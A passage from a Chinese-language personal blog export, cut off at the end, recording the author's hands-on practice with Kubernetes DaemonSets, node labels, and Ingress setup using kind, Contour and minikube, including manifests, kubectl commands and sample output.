class=\"comment\"># Events:</span></span><br><span class=\"line\"><span class=\"comment\">#   Type    Reason            Age    From                  Message</span></span><br><span class=\"line\"><span class=\"comment\">#   ----    ------            ----   ----                  -------</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-rqpth</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-g5r57</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-bzv6c</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-sjt9l</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-vfs9w</span></span><br><span class=\"line\"><span class=\"comment\">#   Normal  SuccessfulCreate  2m53s  daemonset-controller  Created pod: fluentd-elasticsearch-wxf6v</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get pods -o wide --namespace kube-system   </span><br><span class=\"line\"><span class=\"comment\"># NAME                                          READY   STATUS    RESTARTS   AGE     IP           NODE                  NOMINATED NODE   READINESS GATES</span></span><br><span class=\"line\"><span class=\"comment\"># fluentd-elasticsearch-bzv6c                   1/1     Running   0          6m38s   10.244.2.2   kind-control-plane3   &lt;none&gt;           &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># fluentd-elasticsearch-g5r57                   1/1     Running   0          6m38s   10.244.0.2   kind-control-plane    &lt;none&gt;           &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># fluentd-elasticsearch-rqpth                   1/1     Running   0          6m38s   10.244.1.5   kind-control-plane2   &lt;none&gt;           &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># fluentd-elasticsearch-sjt9l                   1/1     Running   0          6m38s   10.244.5.2   kind-worker3          &lt;none&gt;           &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># fluentd-elasticsearch-vfs9w                   1/1     Running   0          6m38s   10.244.3.2   kind-worker           &lt;none&gt;           &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># fluentd-elasticsearch-wxf6v                   1/1     Running   0          6m38s   10.244.4.2   kind-worker2          &lt;none&gt;           &lt;none&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"node-新增一個-Label\"><a href=\"#node-新增一個-Label\" class=\"headerlink\" title=\"node 新增一個 Label\"></a>node 新增一個 Label</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看 nodes 名稱有哪些</span></span><br><span class=\"line\">kubectl get nodes</span><br><span class=\"line\"><span class=\"comment\"># NAME                  STATUS   ROLES    AGE   VERSION</span></span><br><span class=\"line\"><span class=\"comment\"># kind-control-plane    Ready    master   34m   v1.19.1</span></span><br><span class=\"line\"><span class=\"comment\"># kind-control-plane2   Ready    master   33m   v1.19.1</span></span><br><span class=\"line\"><span class=\"comment\"># kind-control-plane3   Ready    master   32m   v1.19.1</span></span><br><span class=\"line\"><span class=\"comment\"># kind-worker           Ready    &lt;none&gt;   32m   v1.19.1</span></span><br><span class=\"line\"><span class=\"comment\"># kind-worker2          Ready    &lt;none&gt;   32m   v1.19.1</span></span><br><span class=\"line\"><span class=\"comment\"># kind-worker3          Ready    &lt;none&gt;   32m   v1.19.1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 新增一個 label</span></span><br><span class=\"line\">kubectl label nodes kind-control-plane ssd=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看 selector ssd=true nodes</span></span><br><span class=\"line\">kubectl get nodes --selector ssd=<span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">\"DaemonSet\"</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\"><span class=\"attr\">    ssd:</span> <span class=\"string\">\"true\"</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">nginx-fast-storage</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    matchLabels:</span></span><br><span class=\"line\"><span class=\"attr\">      app:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\"><span class=\"attr\">  template:</span></span><br><span class=\"line\"><span class=\"attr\">    metadata:</span></span><br><span class=\"line\"><span class=\"attr\">      labels:</span></span><br><span class=\"line\"><span class=\"attr\">        app:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\"><span class=\"attr\">        ssd:</span> <span class=\"string\">\"true\"</span></span><br><span class=\"line\"><span class=\"attr\">    spec:</span></span><br><span class=\"line\"><span class=\"attr\">      tolerations:</span></span><br><span class=\"line\">      <span class=\"comment\"># this toleration is to have the daemonset runnable on master nodes</span></span><br><span class=\"line\">      <span class=\"comment\"># remove it if your masters can't run pods</span></span><br><span class=\"line\"><span class=\"attr\">      - key:</span> <span class=\"string\">node-role.kubernetes.io/master</span></span><br><span class=\"line\"><span class=\"attr\">        effect:</span> <span class=\"string\">NoSchedule</span></span><br><span class=\"line\"><span class=\"attr\">      nodeSelector:</span></span><br><span class=\"line\"><span class=\"attr\">        ssd:</span> <span class=\"string\">\"true\"</span></span><br><span class=\"line\"><span class=\"attr\">      containers:</span></span><br><span class=\"line\"><span class=\"attr\">        - name:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\"><span class=\"attr\">          image:</span> <span class=\"attr\">nginx:1.10.0</span></span><br></pre></td></tr></table></figure>\n<p>這邊有實作<a href=\"https://ithelp.ithome.com.tw/articles/10251596\" target=\"_blank\" rel=\"noopener\">Day-25 認識DaemonSet - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br>Pod 都沒有出來</p>\n<p>不知道是不是 Kind 出問題??</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">tolerations:</span></span><br><span class=\"line\"><span class=\"comment\"># this toleration is to have the daemonset runnable on master nodes</span></span><br><span class=\"line\"><span class=\"comment\"># remove it if your masters can't run pods</span></span><br><span class=\"line\"><span class=\"attr\">- key:</span> <span class=\"string\">node-role.kubernetes.io/master</span></span><br><span class=\"line\"><span class=\"attr\">  effect:</span> <span class=\"string\">NoSchedule</span></span><br></pre></td></tr></table></figure>\n<p>這行家這個就能跑了…<br>在研究什麼原因</p>\n<h2 id=\"刪除-DaemonSet\"><a href=\"#刪除-DaemonSet\" class=\"headerlink\" title=\"刪除 DaemonSet\"></a>刪除 DaemonSet</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl delete daemonset nginx-fast-storage</span><br></pre></td></tr></table></figure>","categories":["Kuberenetes"],"tags":["Kubernetes","daemonset"]},{"title":"Kubernetes 使用 Ingress 做負載平衡","url":"/blog/2021/02/11/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/","content":"<p>最近我在學習 Kubernetes，我有問我 K8S 裡面使用 load balance 能不能做到 Cookies 第一次指向到某一台 Server<br>我那時後才學到 Service ，Service 是使用 iptable 所以應該無法做到<br>我剛看到 Ingress 章節，應該是可以做到我朋友需求<br>但仔細想想，探討這個問題也應該沒有意義<br>使用 K8S 應該就是使用微服務架構，探討 Server 會不會掛掉或更新， Pod 都一定會重置</p>\n<p>搜為網路上看一下， 單獨 Ingress 不是可以做到，需要一個 Ingress Controller 才能做到(這邊這個好像就是 nginx 這種東西)<br>不過，Ingress 和 Ingress Controller </p>\n<blockquote>\n<p>Ingress 本身並沒有提供負載平衡的功能，還需要透過 Ingress Controller 來實現。Ingress Controller 目前主要支援兩種型別 GCE 與 Nginx，而今天我們將透過 Nginx Ingress Controller 在 Kubernetes Cluster 內部架設 load balancer。</p>\n</blockquote>\n<p>來源: <a href=\"https://ithelp.ithome.com.tw/articles/10196261\" target=\"_blank\" rel=\"noopener\">[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<p><strong>2021-02-04</strong><br>我找到我朋友說的<code>使用 load balance 能不能做到 Cookies 第一次指向到某一台 Server</code><br>專有述語叫做 <code>Sticky Session</code><br>Nginx Ingress Controller 可以做到</p>\n<ul>\n<li><a href=\"https://kubernetes.github.io/ingress-nginx/examples/affinity/cookie/\" target=\"_blank\" rel=\"noopener\">Sticky Sessions - NGINX Ingress Controller</a></li>\n<li><a href=\"https://doc.traefik.io/traefik/routing/services/#sticky-sessions\" target=\"_blank\" rel=\"noopener\">Services - Traefik</a></li>\n<li><a href=\"https://blog.csdn.net/linuxerlin/article/details/107561912\" target=\"_blank\" rel=\"noopener\">Ingress session sticky_总结、分享、交流-CSDN博客</a><br>結論還是能做到的</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>之前有碰過 traefik ，在使用 docker 情況下 ，traefik 是使用 docker label 去抓設定<br>我原本以為 K8s 應該也差不多<br>後來看到 Ingress 跟 Ingress Controller 一直在想這件事情<br>突然想到 Ingress 應該就控制網站Virtual Server(不確定是不是這樣叫) 設定<br>Ingress Controller 可能是 Apache , nginx (類似這些東西做反向代理)<br>這樣換不同 Ingress Controller 也不用重新設定<br>應該是這樣定位吧(我自己想的)</p>\n<p>教學還是建議看 <a href=\"https://ithelp.ithome.com.tw/articles/10196261\" target=\"_blank\" rel=\"noopener\">[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br>我這邊還是以操作紀錄為主</p>\n<p>Kind 由於先前發現做 NodePort 會有問題，這邊用 minikube 可能比較不會出狀況<br>當然官方也是有方法可以避免<br>可以看一下官方操作方法<a href=\"https://kind.sigs.k8s.io/docs/user/ingress/\" target=\"_blank\" rel=\"noopener\">kind – Ingress</a><br>主要是 expose port</p>\n<h2 id=\"Kind-官方設定教學\"><a href=\"#Kind-官方設定教學\" class=\"headerlink\" title=\"Kind 官方設定教學\"></a>Kind 官方設定教學</h2><h3 id=\"對應環境設定-Kind\"><a href=\"#對應環境設定-Kind\" class=\"headerlink\" title=\"對應環境設定 (Kind)\"></a>對應環境設定 (Kind)</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kind delete cluster <span class=\"comment\"># 確定刪除</span></span><br><span class=\"line\">kubectl config get-context <span class=\"comment\"># 確定使用的 k8s 連結設定</span></span><br><span class=\"line\">cat &lt;&lt;EOF | kind create cluster --config=-</span><br><span class=\"line\">kind: Cluster</span><br><span class=\"line\">apiVersion: kind.x-k8s.io/v1alpha4</span><br><span class=\"line\">nodes:</span><br><span class=\"line\">- role: control-plane</span><br><span class=\"line\">  kubeadmConfigPatches:</span><br><span class=\"line\">  - |</span><br><span class=\"line\">    kind: InitConfiguration</span><br><span class=\"line\">    nodeRegistration:</span><br><span class=\"line\">      kubeletExtraArgs:</span><br><span class=\"line\">        node-labels: <span class=\"string\">\"ingress-ready=true\"</span></span><br><span class=\"line\">  extraPortMappings:</span><br><span class=\"line\">  - containerPort: 80</span><br><span class=\"line\">    hostPort: 80</span><br><span class=\"line\">    protocol: TCP</span><br><span class=\"line\">  - containerPort: 443</span><br><span class=\"line\">    hostPort: 443</span><br><span class=\"line\">    protocol: TCP</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<h3 id=\"安裝-Contour-Ingress-Controller\"><a href=\"#安裝-Contour-Ingress-Controller\" class=\"headerlink\" title=\"安裝 Contour (Ingress Controller)\"></a>安裝 Contour (Ingress Controller)</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://projectcontour.io/quickstart/contour.yaml</span><br><span class=\"line\"><span class=\"comment\"># namespace/projectcontour created</span></span><br><span class=\"line\"><span class=\"comment\"># serviceaccount/contour created</span></span><br><span class=\"line\"><span class=\"comment\"># serviceaccount/envoy created</span></span><br><span class=\"line\"><span class=\"comment\"># configmap/contour created</span></span><br><span class=\"line\"><span class=\"comment\"># customresourcedefinition.apiextensions.k8s.io/extensionservices.projectcontour.io created</span></span><br><span class=\"line\"><span class=\"comment\"># customresourcedefinition.apiextensions.k8s.io/httpproxies.projectcontour.io created</span></span><br><span class=\"line\"><span class=\"comment\"># customresourcedefinition.apiextensions.k8s.io/tlscertificatedelegations.projectcontour.io created</span></span><br><span class=\"line\"><span class=\"comment\"># serviceaccount/contour-certgen created</span></span><br><span class=\"line\"><span class=\"comment\"># rolebinding.rbac.authorization.k8s.io/contour created</span></span><br><span class=\"line\"><span class=\"comment\"># role.rbac.authorization.k8s.io/contour-certgen created</span></span><br><span class=\"line\"><span class=\"comment\"># job.batch/contour-certgen-v1.12.0 created</span></span><br><span class=\"line\"><span class=\"comment\"># clusterrolebinding.rbac.authorization.k8s.io/contour created</span></span><br><span class=\"line\"><span class=\"comment\"># clusterrole.rbac.authorization.k8s.io/contour created</span></span><br><span class=\"line\"><span class=\"comment\"># service/contour created</span></span><br><span class=\"line\"><span class=\"comment\"># service/envoy created</span></span><br><span class=\"line\"><span class=\"comment\"># deployment.apps/contour created</span></span><br><span class=\"line\"><span class=\"comment\"># daemonset.apps/envoy created</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"設定-daemonsets\"><a href=\"#設定-daemonsets\" class=\"headerlink\" title=\"設定 daemonsets\"></a>設定 daemonsets</h3><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"spec\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"template\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"spec\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"nodeSelector\"</span>: &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"ingress-ready\"</span>: <span class=\"string\">\"true\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">\"tolerations\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"key\"</span>: <span class=\"string\">\"node-role.kubernetes.io/master\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">\"operator\"</span>: <span class=\"string\">\"Equal\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">\"effect\"</span>: <span class=\"string\">\"NoSchedule\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl patch daemonsets -n projectcontour envoy -p <span class=\"string\">'&#123;\"spec\":&#123;\"template\":&#123;\"spec\":&#123;\"nodeSelector\":&#123;\"ingress-ready\":\"true\"&#125;,\"tolerations\":[&#123;\"key\":\"node-role.kubernetes.io/master\",\"operator\":\"Equal\",\"effect\":\"NoSchedule\"&#125;]&#125;&#125;&#125;&#125;'</span></span><br></pre></td></tr></table></figure>\n<p>先設定，之後代研究這個是做什麼用<br>但我發現這個沒設定好像也能跑 = =a</p>\n<h3 id=\"使用-Ingress\"><a href=\"#使用-Ingress\" class=\"headerlink\" title=\"使用 Ingress\"></a>使用 Ingress</h3><p>預設好像就有這個，所以不需要特別裝</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">foo-app</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">foo</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">  - name:</span> <span class=\"string\">foo-app</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">hashicorp/http-echo:0.2.3</span></span><br><span class=\"line\"><span class=\"attr\">    args:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">\"-text=foo\"</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">foo-service</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">foo</span></span><br><span class=\"line\"><span class=\"attr\">  ports:</span></span><br><span class=\"line\">  <span class=\"comment\"># Default port used by the image</span></span><br><span class=\"line\"><span class=\"attr\">  - port:</span> <span class=\"number\">5678</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">bar-app</span></span><br><span class=\"line\"><span class=\"attr\">  labels:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">bar</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">  - name:</span> <span class=\"string\">bar-app</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">hashicorp/http-echo:0.2.3</span></span><br><span class=\"line\"><span class=\"attr\">    args:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">\"-text=bar\"</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">bar-service</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">bar</span></span><br><span class=\"line\"><span class=\"attr\">  ports:</span></span><br><span class=\"line\">  <span class=\"comment\"># Default port used by the image</span></span><br><span class=\"line\"><span class=\"attr\">  - port:</span> <span class=\"number\">5678</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">networking.k8s.io/v1beta1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Ingress</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">example-ingress</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  rules:</span></span><br><span class=\"line\"><span class=\"attr\">  - http:</span></span><br><span class=\"line\"><span class=\"attr\">      paths:</span></span><br><span class=\"line\"><span class=\"attr\">      - path:</span> <span class=\"string\">/foo</span></span><br><span class=\"line\"><span class=\"attr\">        backend:</span></span><br><span class=\"line\"><span class=\"attr\">          serviceName:</span> <span class=\"string\">foo-service</span></span><br><span class=\"line\"><span class=\"attr\">          servicePort:</span> <span class=\"number\">5678</span></span><br><span class=\"line\"><span class=\"attr\">      - path:</span> <span class=\"string\">/bar</span></span><br><span class=\"line\"><span class=\"attr\">        backend:</span></span><br><span class=\"line\"><span class=\"attr\">          serviceName:</span> <span class=\"string\">bar-service</span></span><br><span class=\"line\"><span class=\"attr\">          servicePort:</span> <span class=\"number\">5678</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br></pre></td></tr></table></figure>\n<p>上面建立兩個pod,service，然後新增 Ingress 設定</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://kind.sigs.k8s.io/examples/ingress/usage.yaml</span><br></pre></td></tr></table></figure>\n<h3 id=\"執行內容\"><a href=\"#執行內容\" class=\"headerlink\" title=\"執行內容\"></a>執行內容</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># should output \"foo\"</span></span><br><span class=\"line\">curl localhost/foo</span><br><span class=\"line\"><span class=\"comment\"># should output \"bar\"</span></span><br><span class=\"line\">curl localhost/bar</span><br></pre></td></tr></table></figure>\n<h3 id=\"查看-Ingress-指令\"><a href=\"#查看-Ingress-指令\" class=\"headerlink\" title=\"查看 Ingress 指令\"></a>查看 Ingress 指令</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get ingress</span><br><span class=\"line\">kubectl describle ingress simple-ingress</span><br></pre></td></tr></table></figure>\n<h3 id=\"kubernetes之ingress-error-endpoints-“default-http-backend”-not-found\"><a href=\"#kubernetes之ingress-error-endpoints-“default-http-backend”-not-found\" class=\"headerlink\" title=\"kubernetes之ingress error: endpoints “default-http-backend” not found\"></a>kubernetes之ingress error: endpoints “default-http-backend” not found</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">翻譯：</span><br><span class=\"line\">控制器。注意:根據您正在使用的Ingress控制器，您可能需要創建一個default-http-backend服務。</span><br><span class=\"line\">違約後端</span><br><span class=\"line\">沒有規則的入口將所有流量發送到一個默認後端。默認後端通常是Ingress控制器的一個配置選項，在您的Ingress資源中沒有指定。</span><br><span class=\"line\">如果Ingress對象中的主機或路徑都不匹配HTTP請求，則流量將被路由到默認後端。</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://www.cnblogs.com/zoulixiang/p/13554893.html\" target=\"_blank\" rel=\"noopener\">kubernetes之ingress error: endpoints “default-http-backend” not found - Mr.zou - 博客园</a></p>\n<h2 id=\"使用-host-名稱對應-service\"><a href=\"#使用-host-名稱對應-service\" class=\"headerlink\" title=\"使用 host 名稱對應 service\"></a>使用 host 名稱對應 service</h2><p>由於書中跟 <a href=\"https://ithelp.ithome.com.tw/articles/10196261\" target=\"_blank\" rel=\"noopener\">[Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br>為了加速實作，這邊使用上面範例</p>\n<h3 id=\"使用-minikube\"><a href=\"#使用-minikube\" class=\"headerlink\" title=\"使用 minikube\"></a>使用 minikube</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 啟用 minikube 的 ingress</span></span><br><span class=\"line\">minikube addons <span class=\"built_in\">enable</span> ingress</span><br><span class=\"line\"><span class=\"comment\"># 取得 minikube ip</span></span><br><span class=\"line\">minikube ip</span><br></pre></td></tr></table></figure>\n<h3 id=\"service-pod-ingress-設定\"><a href=\"#service-pod-ingress-設定\" class=\"headerlink\" title=\"service ,pod , ingress 設定\"></a>service ,pod , ingress 設定</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 建立測試 pod</span></span><br><span class=\"line\">kubectl create -f  https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/helloworld-pod.yaml</span><br></pre></td></tr></table></figure>\n<p>事後想想這邊可以用上面範例 echo 出不同字串<br>這樣就可以知道用到哪一個 pod</p>\n<p>建立兩個測試用 serivce 都倒同一個 service</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">helloworld-v1</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  ports:</span></span><br><span class=\"line\"><span class=\"attr\">  - port:</span> <span class=\"number\">3000</span></span><br><span class=\"line\"><span class=\"attr\">    protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\"><span class=\"attr\">    targetPort:</span> <span class=\"number\">3000</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">helloworld-pod</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">helloworld-v2</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  ports:</span></span><br><span class=\"line\"><span class=\"attr\">  - port:</span> <span class=\"number\">3000</span></span><br><span class=\"line\"><span class=\"attr\">    protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\"><span class=\"attr\">    targetPort:</span> <span class=\"number\">3000</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    app:</span> <span class=\"string\">helloworld-pod</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl create -f https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/helloworld-service.yaml</span><br><span class=\"line\">kubectl get svc</span><br><span class=\"line\"><span class=\"comment\"># Name:              helloworld-v1</span></span><br><span class=\"line\"><span class=\"comment\"># Namespace:         default</span></span><br><span class=\"line\"><span class=\"comment\"># Labels:            &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Annotations:       &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Selector:          app=helloworld-pod</span></span><br><span class=\"line\"><span class=\"comment\"># Type:              ClusterIP</span></span><br><span class=\"line\"><span class=\"comment\"># IP Families:       &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># IP:                10.96.172.11</span></span><br><span class=\"line\"><span class=\"comment\"># IPs:               &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Port:              &lt;unset&gt;  3000/TCP</span></span><br><span class=\"line\"><span class=\"comment\"># TargetPort:        3000/TCP</span></span><br><span class=\"line\"><span class=\"comment\"># Endpoints:         172.17.0.7:3000</span></span><br><span class=\"line\"><span class=\"comment\"># Session Affinity:  None</span></span><br><span class=\"line\"><span class=\"comment\"># Events:            &lt;none&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Name:              helloworld-v2</span></span><br><span class=\"line\"><span class=\"comment\"># Namespace:         default</span></span><br><span class=\"line\"><span class=\"comment\"># Labels:            &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Annotations:       &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Selector:          app=helloworld-pod</span></span><br><span class=\"line\"><span class=\"comment\"># Type:              ClusterIP</span></span><br><span class=\"line\"><span class=\"comment\"># IP Families:       &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># IP:                10.96.251.221</span></span><br><span class=\"line\"><span class=\"comment\"># IPs:               &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># Port:              &lt;unset&gt;  3000/TCP</span></span><br><span class=\"line\"><span class=\"comment\"># TargetPort:        3000/TCP</span></span><br><span class=\"line\"><span class=\"comment\"># Endpoints:         172.17.0.7:3000</span></span><br><span class=\"line\"><span class=\"comment\"># Session Affinity:  None</span></span><br><span class=\"line\"><span class=\"comment\"># Events:            &lt;none&gt;</span></span><br></pre></td></tr></table></figure>\n<p>確認是否成功</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 進去 node 確認狀況</span></span><br><span class=\"line\">minikube ssh</span><br><span class=\"line\"><span class=\"comment\"># 確認 pods 可以正常連到</span></span><br><span class=\"line\">curl 10.96.172.11:3000</span><br></pre></td></tr></table></figure>\n<p>繼續建立 ingress controller</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 官方安裝 nginx ingress controller</span></span><br><span class=\"line\">kubectl apply -f 